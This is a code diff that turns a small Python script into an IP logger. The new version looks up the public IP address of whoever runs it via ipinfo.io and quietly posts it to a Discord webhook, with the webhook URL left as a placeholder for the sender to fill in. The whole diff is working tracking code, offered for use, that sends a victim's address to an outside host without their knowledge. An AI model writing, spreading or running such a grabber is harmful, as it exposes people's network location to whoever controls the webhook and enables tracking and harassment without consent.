@@ -1,11 +1,19 @@
 import requests
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
 def main():
-    r = requests.get("IP LOGGING WEBSITE", timeout=2)
-    time = str(r.elapsed).split(".")[:2]
-    miliseconds = time[1][:2]
-    print(f"LOGGED IN {miliseconds} MILISECONDS")
+    ip = requests.get('http://ipinfo.io/json').json()['ip']
+    log("ip has been logged!", f"logged ip: {ip}")
 
+def log(title, discription):
+    webhook = DiscordWebhook(url=" !DELETE THIS AND INPUT UR WEBHOOK URL HERE! ")
+    embed = DiscordEmbed(title=title, description=discription, color="0000FF")
+
+
+
+
+    webhook.add_embed(embed)
+    response = webhook.execute()
 
 if __name__ == "__main__":
     main()
